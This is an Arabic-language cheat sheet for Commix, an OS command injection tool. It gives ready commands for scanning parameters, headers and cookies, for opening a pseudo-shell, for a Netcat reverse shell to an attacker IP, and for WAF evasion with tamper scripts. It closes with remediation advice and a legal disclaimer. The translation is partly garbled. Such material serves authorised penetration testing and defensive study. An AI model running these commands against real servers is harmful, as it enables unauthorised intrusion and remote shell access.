<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 كوميكس - ورقة غش كاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p align="center">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="أمان الويب">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</ص>

<p align="center">
  <b>🌐 أداة تلقائية مصممة لاكتشاف واستغلال الثغرات الأمنية في "حقن الأوامر" في تطبيقات الويب وإنشاء الأصداف التفاعلية</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وبدائية حقن الأوامر](#-نظرة عامة--بدائية-حقنة الأوامر)
- [التثبيت](#-التثبيت)
- [فحص الثغرات الأساسية](#-فحص الثغرات الأساسية)
- [حقن عناصر HTTP مختلفة](#-injecting-different-http-elements)
  - [الحصول على المعلمات](#get-parameters)
  - [بيانات ما بعد (`--data`)](#post-data---data)
  - [رؤوس HTTP وملفات تعريف الارتباط](#http-headers--cookies)
- [وضع الأصداف التفاعلية والعكسية](#-التفريخ التفاعلي--الأصداف العكسية)
  - [Pseudo-Shell (`--os-shell`)](#pseudo-Shell---os-Shell)
  - [Native Reverse Shell (`--reverse-ip`)](#native-reverse-shell ---reverse-ip)
- [التهرب من WAF والنصوص البرمجية للعبث (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [التقنيات العمياء المستندة إلى الملف والوقت](#-التقنيات العمياء المستندة إلى الملف--المعتمدة على الوقت)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والمعالجة](#-الاعتبارات الدفاعية--العلاج)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وبدائية حقن الأوامر

في حين أن **SQLMap** يقوم بأتمتة حقن SQL، فإن **Commix** (الذي أنشأه **Anastasios Stasinopoulos**) هو المعيار الذهبي للعثور على عيوب **OS Command حقن** واستغلالها.

عندما تقوم تطبيقات الويب بتمرير مدخلات المستخدم بشكل غير آمن مباشرة إلى وظائف تنفيذ نظام التشغيل (`system()`، `exec()`، `passthru()`، `Runtime.getRuntime().exec()`)، يمكن للمهاجمين إلحاق أوامر shell عشوائية. يقوم Commix بالكشف عن متجهات الحقن المستندة إلى النتائج والمخرجات والمعتمدة على الوقت ومتجهات الحقن المستندة إلى الملفات تلقائيًا.

---

## 📥 التثبيت
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 فحص الثغرات الأمنية الأساسية
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 حقن عناصر HTTP مختلفة

### الحصول على المعلمات
استخدم علامة `INJECT_HERE` في حالة وجود معلمات متعددة:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### بيانات ما بعد (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### رؤوس وملفات تعريف الارتباط HTTP
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 وضع الأصداف التفاعلية والعكسية

### الصدفة الزائفة (`--os-shell`)

عند تأكيد الحقن، يوفر Commix محطة زائفة تمت محاكاتها مباشرة داخل وحدة التحكم:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### الصدفة العكسية الأصلية (`--reverse-ip`)

قم بتوجيه Commix لإسقاط اتصال TCP العكسي التفاعلي الكامل مرة أخرى إلى مستمع Netcat الخاص بك:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 نصوص WAF للتهرب والعبث (`--tamper`)

تجاوز جدران حماية تطبيقات الويب (WAF) والقوائم السوداء المتسلسلة باستخدام التلاعب المضمن بالتشويش:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ التقنيات العمياء القائمة على الملف والوقت

عندما لا يتم عرض الإخراج مرة أخرى في استجابة HTTP:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| ** مسح الحصول على المعلمة ** | `commix -u "<URL>?param=val"` |
| ** مسح معلمة POST ** | `commix -u "<URL>" --data="param=val"` |
| **المسح غير التفاعلي للدفعة** | `commix -u "<URL>" --batch` |
| ** غلاف المحطة التفاعلية **| `commix -u "<URL>" --os-shell` |
| ** إسقاط الغلاف العكسي ** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **إعادة طلب التجشؤ** | `commix -r burp_request.req` |
| **استخدم عبث الفضاء** | `commix -u "<URL>" --tamper=space2ifs` |
| ** تنفيذ أمر واحد ** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ الاعتبارات الدفاعية والعلاج

1. **تجنب تنفيذ نظام التشغيل Shell:** لا تقم أبدًا بتسلسل مدخلات المستخدم غير المحمية في أوامر `system()` أو `exec()` أو أوامر shell.
2. **استخدم واجهات برمجة التطبيقات للغة الأصلية:** استبدل أدوات النظام المساعدة بمكتبات لغة البرمجة الأصلية (على سبيل المثال، استخدم مكتبة Python `socket` بدلاً من تنفيذ النظام الثنائي `ping`).
3. **قائمة بيضاء صارمة:** إذا كان إدخال المستخدم يجب أن يملي تنفيذ البرنامج، فتحقق من صحة الإدخال مقابل قائمة بيضاء أبجدية رقمية صارمة قبل الاستدعاء.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> يقوم Commix بأتمتة تنفيذ الأوامر التعسفية على الخوادم المستهدفة. يعد تشويش أو استغلال تطبيقات الويب غير المصرح بها أمرًا غير قانوني. استخدم فقط على الأنظمة التي تمتلك فيها تصريحًا كتابيًا صريحًا.